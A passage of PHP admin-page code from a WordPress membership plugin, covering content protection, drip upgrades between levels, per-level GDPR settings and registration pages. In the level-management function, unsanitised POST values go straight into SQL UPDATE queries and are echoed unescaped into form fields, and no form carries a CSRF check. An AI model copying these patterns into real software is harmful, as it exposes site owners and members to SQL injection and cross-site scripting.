						if (isset($levelInfo->level_all) && $levelInfo->level_all == 1) { $checked = true; $disabled = true; } $disabled = $disabled || (isset($levelInfo->level_page_login) && $levelInfo->level_page_login && $post->ID == $levelInfo->level_page_login); $disabled = $disabled || (isset($levelInfo->level_page_register) && $levelInfo->level_page_register && $post->ID == $levelInfo->level_page_register); ?>
						<?php ?>
						<tr class="alternate member-row">
							<th scope="row" class="check-column">
								<input type="hidden" name="membergenius_posts[<?php echo intval($post->ID); ?>]" value="1" />
								<input type="checkbox" <?php if ($disabled): ?>disabled="disabled"<?php endif; ?> <?php if ($checked): ?>checked="checked"<?php endif; ?> name="membergenius_checked[<?php echo intval($post->ID); ?>]" id="membergenius_checked[<?php echo intval($post->ID); ?>]" />
							</th>
							<td><label for="membergenius_checked[<?php echo intval($post->ID); ?>]"><?php echo date("m/d/" . chr(89), strtotime($post->post_date)); ?></label></td>
							<td><a href="<?php echo get_edit_post_link($post->ID); ?>"><b><?php echo htmlentities($post->post_title); ?></b></a></td>
							<td>
								<?php
								$levelLinks = array();
								foreach ($membergenius->model->getLevelsFromPost($post->ID) as $levelAccess => $levelName) {
									if (!isset($allLevels[$levelAccess])) { continue; }
									$protected = $membergenius->model->isProtected($post->ID);
									if ($protected) {
										if ($levelName) {
											$levelLinks[] = '<a href="'.$this->tabLink("levels").'">'.htmlentities($levelName).'</a>';
										}
									} else {
										$levelLinks[] = "<i>Everyone</i>";
										break;
									}
								} ?>
								<?php echo implode(", ", $levelLinks); ?>
							</td>
							<td>
								<?php if ($post->post_status == "publish"): ?>Published
								<?php elseif ($post->post_status == "pending"): ?>Pending
								<?php elseif ($post->post_status == "draft"): ?>Draft
								<?php elseif ($post->post_status == "future"): ?>Scheduled
								<?php elseif ($post->post_status == "private"): ?>Private
								<?php endif; ?>
							</td>
						</tr>
						<?php endforeach; ?>
					</tbody>
				</table>
				<p><input type="submit" class="button-primary" value="Save All Changes" /></p>
			</form>
		</div>
		<?php
	}

	public function menu_levels() {
		global $membergenius;
		$action = (isset($_GET["membergenius_action"])) ? $_GET["membergenius_action"] : "levels"; ?>
		<div class="wrap" style="clear:both;">
		<?php $this->menu_header("Levels"); ?>
		<h3 class="nav-tab-wrapper menu-tabs-wrapper">
			<a class="nav-tab<?php if ($action == "levels"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-levels&membergenius_action=levels">Manage Levels</a>
			<a class="nav-tab<?php if ($action == "registration"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-levels&membergenius_action=registration">Registration Page</a>
			<a class="nav-tab<?php if ($action == "upgrade"): ?> nav-tab-active<?php endif; ?>" href="?page=<?php echo plugin_basename('miembro-press/miembro-press.php'); ?>-levels&membergenius_action=upgrade">Sequential Upgrade</a>
		</h3>
		<?php
		if ($action == "levels") {
			$this->menu_levels_list();
		} elseif ($action == "registration") {
			$this->menu_levels_registration();
		} elseif ($action == "upgrade") {
			$this->menu_levels_upgrade();
		} ?>
		<?php
	}

	public function menu_levels_upgrade() {
		global $membergenius;
		$levels = $membergenius->model->getLevels();
		$change = false;
		wp_enqueue_script('jquery');
		wp_enqueue_script('jquery-ui-datepicker');
		wp_enqueue_style('jquery-style', '//ajax.googleapis.com/ajax/libs/jqueryui/1.8.2/themes/smoothness/jquery-ui.css'); ?>
		<h3>Sequential Upgrade</h3>
		<p>&quot;Drip&quot; your content by adding rules where members are added or moved to other levels after a delay.</p>
		<p>For example, you could create Levels called Level 1, Level 2, and Level 3. Protect your pages and posts within those modules. Then set a member who's in Level 2 for 10 days, to then add to Level 3.</p>
		<p>When setting the delay below (i.e. add members on Level 2 to Level 3 after 10 days), the number is ONLY the number of days that member has been on the previous level.<br />
		For example, you can set a rule below to upgrade a member from Level 1 to Level 2 after 10 days.<br />
		Then set them to upgrade from Level 2 to Level 3 after 10 days AGAIN, which means that after 20 days of total membership, they make it to Level 3.
		</p>
		<?php
		if (isset($_POST["membergenius_upgrade_level"])) {
			$actions = $_POST["membergenius_upgrade_action"];
			$upgrades = $_POST["membergenius_upgrade_level"];
			$upgrade = 0;
			foreach ($_POST["membergenius_upgrade_level"] as $upgradeFrom => $upgradeTo) {
				$previousLevel = $_POST["membergenius_upgrade_level_previous"][$upgradeFrom];
				$previousAction = $_POST["membergenius_upgrade_level_previous"][$upgradeFrom];
				$previousDelay = @intval($_POST["membergenius_upgrade_delay_previous"][$upgradeFrom]);
				$previousDate = @intval($_POST["membergenius_upgrade_date_previous"][$upgradeFrom]);
				$schedule = $_POST["membergenius_upgrade_schedule"][$upgradeFrom];
				$action = null;
				if (isset($actions[$upgradeFrom])) {
					$action = $actions[$upgradeFrom];
				}
				$delay = 0;
				if ($schedule == "after") {
					$delay = @intval($_POST["membergenius_upgrade_after"][$upgradeFrom]);
				}
				$date = null;
				if ($schedule == "date") {
					$date = @intval($_POST["membergenius_upgrade_date"][$upgradeFrom])/1000;
				} else { $date = null; }

				if ($previousLevel == $upgradeTo && $previousAction == $action && $previousDelay == $delay && $previousDate == $date) { continue; }
				if ($upgradeTo == 0 || !$action) {
					$membergenius->model->levelSetting($upgradeFrom, "add", null);
					$membergenius->model->levelSetting($upgradeFrom, "move", null);
					$membergenius->model->levelSetting($upgradeFrom, "upgrade", null);
					$membergenius->model->levelSetting($upgradeFrom, "delay", null);
					$change = true; continue;
				} else {
					$membergenius->model->levelSetting($upgradeFrom, "dateDelay", $date);
					if ($action == "add") {
						$membergenius->model->levelSetting($upgradeFrom, "add", $upgradeTo);
						$membergenius->model->levelSetting($upgradeFrom, "move", null);
						$change = true;
					} elseif ($action == "move") {
						$membergenius->model->levelSetting($upgradeFrom, "add", null);
						$membergenius->model->levelSetting($upgradeFrom, "move", $upgradeTo);
						$change = true;
					}
					$membergenius->model->levelSetting($upgradeFrom, "delay", $delay);
				}
			}
		} ?>
		<?php if ($change): ?><div class="updated">Changes saved.</div><?php endif; ?>
		<form method="post">
			<table class="widefat" style="width:800px;">
				<thead>
					<tr>
						<th scope="col" style="line-height:20px; width:200px;"><nobr>Membership Level</nobr></th>
						<th scope="col" style="line-height:20px; width:200px;" align="center" width="100"><nobr>When a Member Joins Level</nobr></th>
						<th scope="col" style="line-height:20px; width:200px;">Upgrade To Level</th>
						<th scope="col" style="line-height:20px; width:200px;">Schedule</th>
					</tr>
				</thead>
				<tbody>
					<?php $i = 0; ?>
					<?php foreach ($levels as $level): ?>
					<?php if ($i++ % 2 == 0): ?><tr class="alternate"><?php else: ?><tr><?php endif; ?>
					<?php
					$actionValue = "";
					if ($actionAdd = $membergenius->model->levelSetting($level->ID, "add")) {
						$actionMethod = "add";
						$actionValue = $actionAdd;
					} elseif ($actionMove = $membergenius->model->levelSetting($level->ID, "move")) {
						$actionMethod = "move"; $actionValue = $actionMove;
					} else { $actionMethod = ""; }
					$schedule = null;
					$actionDate = $membergenius->model->levelSetting($level->ID, "dateDelay");
					if ($actionDate) { $schedule = "date"; }
					if (!$actionDate) { $actionDate = 0; }
					$actionDelay = @intval($membergenius->model->levelSetting($level->ID, "delay"));
					if (!$schedule && $actionDelay > 0) { $schedule = "day"; }
					if (!$schedule) { $schedule = "instant"; }
					$levelLink = add_query_arg(array('page' => plugin_basename('miembro-press/miembro-press.php').'-levels', 'membergenius_action' => 'levels'), admin_url('admin.php')); ?>

					<!-- name of level we will apply this to -->
					<td style="padding:5px; padding-left:15px; vertical-align:middle;"><a href="<?php echo $levelLink; ?>"><?php echo htmlentities($level->level_name); ?></a></td>

					<!-- add or move -->
					<td style="padding:5px; vertical-align:middle;" align="center">
						<nobr>
							<input type="hidden" name="membergenius_upgrade_action_previous[<?php echo intval($level->ID); ?>]" value="<?php echo intval($actionValue); ?>" />
							<label><input type="radio" name="membergenius_upgrade_action[<?php echo intval($level->ID); ?>]" value="add" class="membergenius_upgrade_action_add" rel="<?php echo intval($level->ID); ?>" <?php checked($actionMethod == "add"); ?> />Add</label>&nbsp;&nbsp;
							<label><input type="radio" name="membergenius_upgrade_action[<?php echo intval($level->ID); ?>]" value="move" class="membergenius_upgrade_action_move" rel="<?php echo intval($level->ID); ?>" <?php checked($actionMethod == "move"); ?> />Move</label>&nbsp;&nbsp;
							<label><input type="radio" name="membergenius_upgrade_action[<?php echo intval($level->ID); ?>]" value="" class="membergenius_upgrade_action_nothing" rel="<?php echo intval($level->ID); ?>" <?php checked($actionMethod == ""); ?> />Do Nothing</label>
						</nobr>
					</td>

					<!-- select level -->
					<td style="padding:5px; vertical-align:middle;">
						<input type="hidden" name="membergenius_upgrade_level_previous[<?php echo intval($level->ID); ?>]" value="<?php echo intval($actionUpgrade); ?>" />
						<select name="membergenius_upgrade_level[<?php echo intval($level->ID); ?>]" class="membergenius_upgrade_level" rel="<?php echo intval($level->ID); ?>">
							<option value="0">--</option>
							<?php foreach ($levels as $actionLevel): ?>
							<?php
							if ($level->ID == $actionLevel->ID) {
								continue;
							} ?>
							<option value="<?php echo intval($actionLevel->ID); ?>" <?php selected(($actionMethod == "add" && $actionLevel->ID == $actionAdd) || ($actionMethod == "move" && $actionLevel->ID == $actionMove)); ?>><?php echo htmlentities($actionLevel->level_name); ?></option>
							<?php endforeach; ?>
						</select>
					</td>

					<!-- instant, after X days, or on date -->
					<td style="padding:5px; vertical-align:middle;">
						<input type="hidden" name="membergenius_upgrade_delay_previous[<?php echo intval($level->ID); ?>]" value="<?php echo intval($actionValue); ?>" />

						<input type="hidden" name="membergenius_upgrade_date_previous[<?php echo intval($level->ID); ?>]" value="<?php echo intval($actionDate) * 1000; ?>" />
						<input type="hidden" name="membergenius_upgrade_date[<?php echo intval($level->ID); ?>]" id="membergenius_upgrade_date[<?php echo intval($level->ID); ?>]" value="<?php echo intval($actionDate) * 1000; ?>" />
						<nobr>
							<label><input type="radio" name="membergenius_upgrade_schedule[<?php echo intval($level->ID); ?>]" value="instant" class="membergenius_upgrade_delay" rel="<?php echo intval($level->ID); ?>" <?php checked($schedule == "instant"); ?> />Instantly</label><br />
							<label><input type="radio" name="membergenius_upgrade_schedule[<?php echo intval($level->ID); ?>]" value="after" class="membergenius_upgrade_delay" rel="<?php echo intval($level->ID); ?>" <?php checked($schedule == "day"); ?> /><span class="membergenius_upgrade_after_none" style="display:<?php echo (($schedule != "day") ? 'inline' : 'none'); ?>;" rel="<?php echo intval($level->ID); ?>">After...</span><span class="membergenius_upgrade_after" style="display:<?php echo (($schedule == "day") ? 'inline' : 'none'); ?>;" rel="<?php echo intval($level->ID); ?>">After <input type="number" class="membergenius_after_delay" name="membergenius_upgrade_after[<?php echo intval($level->ID); ?>]" size="3" maxlength="5" value="<?php echo max(1, $actionDelay); ?>" style="font-size:11px; width:50px;" /> Days on Level</span>
							</label><br />
							<label><input type="radio" name="membergenius_upgrade_schedule[<?php echo intval($level->ID); ?>]" value="date" class="membergenius_upgrade_delay" rel="<?php echo intval($level->ID); ?>" <?php checked($schedule == "date"); ?> /><span class="membergenius_upgrade_date_none" style="display:<?php echo (($schedule != "date") ? 'inline' : 'none'); ?>;" rel="<?php echo intval($level->ID); ?>">On Date...</span><span class="membergenius_upgrade_date" style="display:<?php echo (($schedule == "date") ? 'inline' : 'none'); ?>;" rel="<?php echo intval($level->ID); ?>">On Date: <input type="text" class="membergenius_date_delay" rel="<?php echo intval($level->ID); ?>" name="membergenius_upgrade_date_display[<?php echo intval($level->ID); ?>]" style="font-size:11px;" /></span>
							</label>
						</nobr>
					</td>
					</tr>
					<?php endforeach; ?>
				</tbody>
			</table>
			<p><input class="button-primary" type="submit" value="Save All Changes" /> <input class="button" type="submit" value="Delete Selected Levels" /></p>
		</form>
		<script type="text/javascript">
		<!--

		jQuery(function() {
			jQuery('.membergenius_date_delay').each(function (i, obj) {
				var rel = jQuery(obj).attr("rel");
				var altField = '#membergenius_upgrade_date<?php echo chr(92) . chr(92); ?>['+rel+'<?php echo chr(92) . chr(92); ?>]';
				var theStamp = parseInt(jQuery(altField).val());
				var theDate;

				if (isNaN(theStamp) || theStamp <= 1) {
				   var now = new Date();
				   theDate = new Date(now.getFullYear(), now.getMonth()+1, 1);
				}
				else {
				   theDate = new Date(theStamp);
				}

				jQuery(obj).datepicker({
				   altField: altField,
				   altFormat: "@",
				   dateFormat: "MM d, yy",
				   showButtonPanel:true,
				});
			   jQuery(obj).datepicker("setDate", theDate);
			   //alert("date="+jQuery(altField).val());
			});
			jQuery('#ui-datepicker-div').hide();

			jQuery('input.membergenius_upgrade_delay[value="instant"]').click(function() {
				var rel = jQuery(this).attr("rel");
				jQuery('span.membergenius_upgrade_date[rel="'+rel+'"]').hide();
				jQuery('span.membergenius_upgrade_date_none[rel="'+rel+'"]').show();
				jQuery('span.membergenius_upgrade_after_none[rel="'+rel+'"]').show();
				jQuery('span.membergenius_upgrade_after[rel="'+rel+'"]').hide();
			});

			// after button clicked
			jQuery('input.membergenius_upgrade_delay[value="after"]').click(function() {
				var rel = jQuery(this).attr("rel");
				jQuery('span.membergenius_upgrade_date[rel="'+rel+'"]').hide();
				jQuery('span.membergenius_upgrade_date_none[rel="'+rel+'"]').show();
				jQuery('span.membergenius_upgrade_after_none[rel="'+rel+'"]').hide();
				jQuery('span.membergenius_upgrade_after[rel="'+rel+'"]').show();
			});

			jQuery('input.membergenius_upgrade_delay[value="date"]').click(function() {
				var rel = jQuery(this).attr("rel");
				jQuery('span.membergenius_upgrade_date[rel="'+rel+'"]').show();
				jQuery('span.membergenius_upgrade_date_none[rel="'+rel+'"]').hide();
				jQuery('span.membergenius_upgrade_after_none[rel="'+rel+'"]').show();
				jQuery('span.membergenius_upgrade_after[rel="'+rel+'"]').hide();
			});

			jQuery(".membergenius_upgrade_level").change(function() {
				var rel = parseInt(jQuery(this).attr("rel"));
				if (isNaN(rel)) { return; }

				var addOption = jQuery(".membergenius_upgrade_action_add[rel='"+rel+"']");
				var moveOption = jQuery(".membergenius_upgrade_action_move[rel='"+rel+"']");

				var instantOption = jQuery(".membergenius_upgrade_delay[rel='"+rel+"'][value='instant']");

				if (jQuery(this).val() == "0") {
				   addOption.attr("checked", false);
				   moveOption.attr("checked", false);
				   instantOption.click();
				}
				else if (!addOption.attr("checked") && !moveOption.attr("checked")) {
				   addOption.attr("checked", true);
				}
			}); // membergenius_upgrade_level
		});
		// -->
		</script>
		<?php
	}

	public function menu_levels_list() {
		global $wpdb;
		global $membergenius;
		$levels = $membergenius->model->getLevels();
		$currentLevel = -1;
		$valoresGDPR = -1;
		$levelTable = $membergenius->model->getLevelTable();
		if (isset($_REQUEST["l"])) {
			$currentLevel = intval($_REQUEST["l"]);
			$valoresGDPR = $wpdb->get_results("SELECT `gdpr_url`, `gdpr_text`, `gdpr_color`, `gdpr_size` FROM `$levelTable` WHERE `ID` = $currentLevel", ARRAY_A);
			foreach ($valoresGDPR as $clave) {
				$gdpr_url = $clave["gdpr_url"];
				$gdpr_text = $clave["gdpr_text"];
				$gdpr_color = $clave["gdpr_color"];
				$gdpr_size = $clave["gdpr_size"];
			}

		}

		$thePages = get_pages();

		$pages = array(0 => "Choose Page");
		foreach ($thePages as $pageKey => $pageValue) {
			if ($pageValue->post_name == "wishlist-member") { continue; }
			if ($pageValue->post_name == "membergenius") { continue; }
			if ($pageValue->post_name == "copyright") { continue; }
			if ($pageValue->post_name == "disclaimer") { continue; }
			if ($pageValue->post_name == "earnings") { continue; }
			if ($pageValue->post_name == "privacy") { continue; }
			if ($pageValue->post_name == "terms-conditions") { continue; }
			$id = $pageValue->ID;
			$title = $pageValue->post_title;
			$pages[$id] = $title;
		}
		asort($pages);
		if (isset($_POST["membergenius_gdpr_url"])){
			$gdprURL = $_POST["membergenius_gdpr_url"];
			$wpdb->query("UPDATE `$levelTable` SET `gdpr_url` = '$gdprURL' WHERE `ID` = $currentLevel");
			if (isset($_POST["membergenius_gdpr_color"])){
				$gdprColor = $_POST["membergenius_gdpr_color"];
				$wpdb->query("UPDATE `$levelTable` SET `gdpr_color` = '$gdprColor' WHERE `ID` = $currentLevel");
			}
			if (isset($_POST["membergenius_gdpr_text"])){
				$gdprText = $_POST["membergenius_gdpr_text"];
				$wpdb->query("UPDATE `$levelTable` SET `gdpr_text` = '$gdprText' WHERE `ID` = $currentLevel");
			}
			if (isset($_POST["membergenius_gdpr_size"])){
				$gdprSize = $_POST["membergenius_gdpr_size"];
				$wpdb->query("UPDATE `$levelTable` SET `gdpr_size` = '$gdprSize' WHERE `ID` = $currentLevel");
			}
			$currentLevel = -1;
		}
		if (isset($_POST["membergenius_delete"]) && is_array($_POST["membergenius_delete"])) {
			$deletes = array_keys($_POST["membergenius_delete"]);
			foreach ($deletes as $delete) {
				$membergenius->model->deleteLevel($delete);
			}
		}
		if (isset($_POST["membergenius_new"]["name"]) && !empty($_POST["membergenius_new"]["name"])) {
			$new = $_POST["membergenius_new"];
			if (!isset($new["all"])) { $new["all"] = false; }
			if (!isset($new["comments"])) { $new["comments"] = false; }
			$membergenius->model->createLevel($new["name"], $new["all"], $new["comments"], $new["hash"]);
		}
		if (isset($_POST["membergenius_level"]) && is_array($_POST["membergenius_level"])) {
			foreach ($_POST["membergenius_level"] as $levelID => $levelName) {
				$levelAll = isset($_POST["membergenius_all"][$levelID]) ? true : false;
				$levelComments = isset($_POST["membergenius_comments"][$levelID]) ? true : false;
				$levelRegister = 0;
				$levelLogin = 0;
				$gdprActive = isset($_POST["membergenius_gdpr_active"][$levelID]) ? true : false;
				if (isset($_POST["level_page_register"][$levelID])) {
					$levelRegister = intval($_POST["level_page_register"][$levelID]);
				}
				if (isset($_POST["level_page_login"][$levelID])) {
					$levelLogin = intval($_POST["level_page_login"][$levelID]);
				}
				if (isset($_POST["level_expiration"][$levelID])) {
					$levelExpiration = intval($_POST["level_expiration"][$levelID]);
				}
				if (!isset($_POST["level_expires"][$levelID])) {
					$levelExpiration = 0;
				}
				$membergenius->model->editLevel($levelID, array( "level_name" => $levelName, "level_all" => $levelAll, "gdpr_active" => $gdprActive, "level_comments" => $levelComments, "level_page_register" => $levelRegister, "level_page_login" => $levelLogin, "level_expiration" => $levelExpiration ));

			}
		} ?>
		<h3>Manage Membership Levels</h3>
		<p>Use levels to create &quot;groups&quot; or &quot;packages&quot; of content to give away or resell.</p>
		<p>After you've created the level you want, use the Content tab to assign content to that level, then use the Members tab to assign members to add them to your level.</p>
		<p><b>Important:</b> Levels cannot be deleted if they contain members. If a level below cannot be deleted, you probably need to remove members from it.</p>
		<form method="post">
			<table class="widefat" style="width:700px;">
				<thead>
					<tr>
						<th scope="col">&nbsp;</th>
						<th scope="col" style="line-height:20px; width:200px;">Membership Level</th>
						<th scope="col" style="line-height:20px; width:100px; padding-right:20px;"><nobr>Access To...</nobr></th>
						<th scope="col" style="line-height:20px;">Registration URL</th>
						<th scope="col" style="line-height:20px; width:400px;">Redirect Pages</th>
						<th scope="col" style="line-height:20px; width:400px;">GDPR</th>
					</tr>
				</thead>
				<tbody>
					<?php $i = 0; ?>
					<?php foreach ($membergenius->model->getLevels() as $level): ?>
						<?php if ($i++ % 2 == 0): ?><tr class="alternate">
						<?php else: ?>
						<tr>
							<?php endif; ?>
							<?php
							$showExpiration = intval($level->level_expiration);
							if ($showExpiration == 0) { $showExpiration = ""; }
							?>
							<td style="padding:5px; vertical-align:top;">
								<?php if ($level->active > 0 || $level->canceled > 0): ?>&nbsp;
								<?php else: ?>
								<input type="checkbox" class="membergenius_delete" name="membergenius_delete[<?php echo intval($level->ID); ?>]" id="membergenius_delete[<?php echo intval($level->ID); ?>]" />
								<?php endif; ?>
							</td>
							<td style="padding:5px; vertical-align:top;">
								<input type="text" name="membergenius_level[<?php echo intval($level->ID); ?>]" size="20" value="<?php echo htmlentities($level->level_name); ?>" /><br />
								<small>
								   &nbsp; <a href="<?php echo $this->tabLink("levels") . "&membergenius_action=registration&l=" . intval($level->ID); ?>">Registration Page</a><br />
								   &nbsp; <a href="<?php echo $this->tabLink("levels") . "&membergenius_action=upgrade"; ?>">Sequential Upgrade</a>
								</small>
							</td>
								<td style="padding:5px; vertical-align:top; padding-right:20px;">
								<nobr><label><input type="checkbox" name="membergenius_all[<?php echo intval($level->ID); ?>]" <?php if ($level->level_all): ?>checked="checked"<?php endif; ?> /> All Posts &amp; Pages</label></nobr><br />
								<nobr><label><input type="checkbox" name="membergenius_comments[<?php echo intval($level->ID); ?>]" <?php if ($level->level_comments): ?>checked="checked"<?php endif; ?> /> Write Comments</label></nobr><br />
								<nobr><label><input type="checkbox" class="membergenius_expires" name="level_expires[<?php echo intval($level->ID); ?>]" <?php checked($level->level_expiration > 0); ?> /> Expires<span class="membergenius_expires_detail" style="display:<?php echo ($level->level_expiration > 0) ? 'inline' : 'none'; ?>"> After <input type="text" class="membergenius_expiration" name="level_expiration[<?php echo intval($level->ID); ?>]" size="2" maxlength="5" value="<?php echo $showExpiration; ?>" style="font-size:10px;" /> Days</span></label></nobr>
							</td>
							<td style="padding:5px; vertical-align:middle;"><a href="<?php echo $membergenius->model->signupURL($level->level_hash); ?>" target="_blank"><?php echo $membergenius->model->signupURL($level->level_hash); ?></a></td>
							<td align="left">
								<nobr>
									<p>
										<label>
											<?php if ($level->level_page_register && ($register = get_permalink(intval($level->level_page_register)))): ?>
											<a target="_blank" href="<?php echo $register; ?>"><strong>After Registration:</strong></a>
											<?php else: ?>
											After Registration:
											<?php endif; ?>
											<select name="level_page_register[<?php echo intval($level->ID); ?>]">
												<?php foreach ($pages as $pageId => $pageTitle): ?>
												<option value="<?php echo $pageId; ?>" <?php selected($level->level_page_register == $pageId); ?>><?php echo htmlentities($pageTitle); ?></option>
												<?php endforeach; ?>
											</select>
										</label>
									</p>
									<p>
										<label>
											<?php if ($level->level_page_login && ($login = get_permalink(intval($level->level_page_login)))): ?>
											<a target="_blank" href="<?php echo $login; ?>"><strong>After Login:</strong></a>
											<?php else: ?>
											After Login:
											<?php endif; ?>

											<select name="level_page_login[<?php echo intval($level->ID); ?>]" style="float:right; clear:right;">
												<?php foreach ($pages as $pageId => $pageTitle): ?>
												<option value="<?php echo $pageId; ?>" <?php selected($level->level_page_login == $pageId); ?>><?php echo htmlentities($pageTitle); ?></option>
												<?php endforeach; ?>
											</select>
										</label>
									</p>
								</nobr>
							</td>
							<?php
							?>
							<td style="padding: 30px 0px 0px 15px;">
							<input type="checkbox" name="membergenius_gdpr_active[<?php echo intval($level->ID); ?>]" <?php if ($level->gdpr_active): ?>checked="checked"<?php endif; ?> />
							</td>
						</tr>
					<?php endforeach; ?>
				</tbody>
			</table>
			<p><input class="button-primary" type="submit" value="Save All Changes" onclick="return membergenius_confirmLevels();" /> <input class="button" type="submit" value="Delete Selected Levels" /></p>
		</form>
	    <script type="text/javascript">
	    <!--
	    jQuery(function() {
			jQuery(".membergenius_expires").click(function() {
				jQuery(this).next(".membergenius_expires_detail").toggle().children(".membergenius_expiration").get(0).select();
			});
		});
		function membergenius_confirmLevels() {
			var result = true;
			jQuery('.membergenius_delete').each(function(i, obj) {
				if (obj.checked) {
					result = confirm('Are you SURE you want to delete the selected levels? This action cannot be undone. Click OK to Continue, or Cancel to stop.');
					return;
				}
			});
			return result;
		}
		// -->
		</script>
		<br />
		<h3>Add a New Membership Level</h3>
		<form method="post">
			<input type="hidden" name="action" value="membergenius_add_level">
			<table class="widefat" style="width:700px;">
				<thead>
					<tr>
						<th style="padding:5px;">&nbsp;</th>
						<th scope="col" style="line-height:20px; width:200px;">Membership Level</th>
						<th scope="col" style="line-height:20px; width:100px;"><nobr>Access To...</nobr></th>
						<th scope="col" style="line-height:20px;">Registration URL</th>
					</tr>
				</thead>
				<tbody>
					<tr class="alternate" style="height:50px;">
						<td style="padding:5px; vertical-align:middle;">&nbsp;</td>
						<td style="padding:5px; vertical-align:middle;"><input type="text" name="membergenius_new[name]" size="20" placeholder="New Level Name"></td>
						<td style="padding:5px; vertical-align:middle;">
							<nobr><label><input type="checkbox" name="membergenius_new[all]" checked="checked" /> All Posts &amp; Pages</label></nobr><br />
							<nobr><label><input type="checkbox" name="membergenius_new[comments]" checked="checked" /> Write Comments</label></nobr>
						</td>
						<td style="padding:5px; vertical-align:middle;"><nobr><label><?php echo $membergenius->model->signupURL(); ?><input type="text" size="8" name="membergenius_new[hash]" value="<?php echo $membergenius->model->hash(); ?>" size="6"></label></nobr></td>
					</tr>
				</tbody>
			</table>
			<p><input class="button-primary" type="submit" value="Add New Level" /></p>
		</div>
		<br />
		<h3>Modify GDPR by Levels</h3>
		<form method="post">
			<p>Select LevelHash: <select name="l" onchange="this.form.submit()">
	            <option value="-1" <?php if ($currentLevel === null || $currentLevel == - 1): ?>selected="selected"<?php endif; ?>>Levels...</option>
	         	<?php foreach ($levels as $level): ?>
	            	<option <?php if ($level->ID == $currentLevel): ?>selected="selected"<?php endif; ?> value="<?php echo intval($level->ID); ?>"><?php echo htmlentities($level->level_name); ?></option>
	         	<?php endforeach; ?>
	         	</select><input class="button-primary" type="submit" value="Select Level" /></p>
			<?php if ($currentLevel > - 1): ?>
				<div><p><?php echo __('<a href="javascript:void" title="Enter URL Privacy Policy" class="tooltip"><span title="Tip">URL Privacy Policy (full URL)</span></a>:', 'kingdomresponse')?>
					<input required type="text" name="membergenius_gdpr_url" value="<?php echo $gdpr_url?>"></p>
					<p><?php echo __('<a href="javascript:void" title="Enter Text Privacy Policy" class="tooltip"><span title="Tip">Text Privacy Policy</span></a>:', 'kingdomresponse')?>
						<input required type="text" name="membergenius_gdpr_text" value="<?php echo $gdpr_text?>"></p>
					<p><?php echo __('<a href="javascript:void" title="Enter Color Text Privacy Policy" class="tooltip"><span title="Tip">Color Privacy Policy</span></a>:', 'kingdomresponse')?>
						<input type="color" name="membergenius_gdpr_color" value="<?php echo $gdpr_color?>"></p>
					<p><?php echo __('<a href="javascript:void" title="Enter Size Text Privacy Policy" class="tooltip"><span title="Tip">Size Text Privacy Policy</span></a>:', 'kingdomresponse')?>
						<input required type="number" name="membergenius_gdpr_size" min="1" max="70" value="<?php echo $gdpr_size?>"></p>
				</div>

	         	<p><input class="button-primary" type="submit" value="Save All Changes" /></p>
         	<?php endif; ?>
		</form>
		</div>
		<?php
	}

	public function menu_levels_registration() {
		global $membergenius;
		$levels = $membergenius->model->getLevels();
		$currentLevel = -1;
		$levelName = "";
		$forLevel = "All Levels";
		if (isset($_REQUEST["l"])) {
			$currentLevel = $_REQUEST["l"];
			if (isset($levels[$currentLevel])) {
				$level = $levels[$currentLevel];
				$levelName = $level->level_name;
				$forLevel = '<a href="'.$membergenius->model->signupURL($level->level_hash).'">'.htmlentities($levelName) . " Level".'</a>';
			}
		}
		$save = null;
		if (isset($_POST["membergenius_save"])) {
			$save = intval($_POST["membergenius_save"]);
		}
		if ($save !== null && isset($_POST["membergenius_registration_header"])) {
			$header = stripslashes($_POST["membergenius_registration_header"]);
			if (!$header || $header == "") {
				$membergenius->model->levelSetting($save, "header", null);
			} else {
				$membergenius->model->levelSetting($save, "header", $header);
			}
		}
		if ($save !== null && isset($_POST["membergenius_registration_footer"])) {
			$footer = stripslashes($_POST["membergenius_registration_footer"]);
			if (!$footer || $footer == "") {
				$membergenius->model->levelSetting($save, "footer", null);
			} else {
				$membergenius->model->levelSetting($save, "footer", $footer);
			}
		}
		$header = $membergenius->model->levelSetting($currentLevel, "header");
		$footer = $membergenius->model->levelSetting($currentLevel, "footer"); ?>
		<h3>Registration Page</h3>
		<p>Customize the look and feel of the registration pages for each level (the screen people see after the pay, and are filling in their account details).</p>
		<p>It is highly recommended you place a Facebook retargeting pixel (custom website audience) or tracking conversion pixel in the &quot;footer&quot; section for the appropriate level.</p>
		<form method="POST">
			<input type="hidden" name="membergenius_save" value="<?php echo intval($currentLevel); ?>" />
			<p>
				<b>Browse Level:</b>
				<a <?php if (-1 == $currentLevel): ?>style="font-weight:bold;"<?php endif; ?>href="<?php echo $this->tabLink("levels") . "&membergenius_action=registration&l=-1"; ?><?php if (isset($_GET["o"])): ?>&o=<?php echo htmlentities($_GET["o"]); ?><?php endif; ?>">All Members (<?php echo $membergenius->model->getMemberCount(); ?>)</a> &nbsp;&nbsp;
				<?php foreach ($levels as $level): ?>
				<a <?php if (is_numeric($currentLevel) && $level->ID == $currentLevel): ?>style="font-weight:bold;"<?php endif; ?> href="<?php echo $this->tabLink("levels") . "&membergenius_action=registration&l=" . intval($level->ID); ?>"><?php echo htmlentities($level->level_name); ?> (<?php echo intval($level->active); ?>)</a> &nbsp;&nbsp;
				<?php endforeach; ?>
			</p>

			<p><b>Registration Page Header for <?php echo $forLevel; ?>:</b><br >
			<textarea name="membergenius_registration_header" class="code" cols="120" rows="8" style="font-size:10px;"><?php echo htmlentities($header); ?></textarea></p>
			<p><b>Registration Page Footer for <?php echo $forLevel; ?>:</b><br >
			<textarea name="membergenius_registration_footer" class="code" cols="120" rows="8" style="font-size:10px;"><?php echo htmlentities($footer); ?></textarea></p>
			<p><input type="submit" class="button-primary" value="Save All Changes"></p>
		</form>
		<?php
	}

	public function menu_autoresponder() {
    	global $membergenius;
        $levels = $membergenius->model->getLevels();
        $currentLevel = -1;
        if (isset($_REQUEST["l"])) { $currentLevel = intval($_REQUEST["l"]); }
        $levelInfo = $membergenius->model->getLevel($currentLevel);
        $saveLevel = null;
        if (isset($_POST["membergenius_save"])) {
            $saveLevel = intval($_POST["membergenius_save"]);
            $membergenius->model->setAutoresponder( $saveLevel, $_POST["membergenius_code"], $_POST["membergenius_email"], $_POST["membergenius_firstname"], $_POST["membergenius_lastname"] );
        }

        $code = "";
        $email = "";
        $firstname = "";
        $lastname = "";

        if ($autoresponder = $membergenius->model->getAutoresponder($currentLevel)) {
            $code = $autoresponder["code"];
            $email = $autoresponder["email"];
            $firstname = $autoresponder["firstname"];
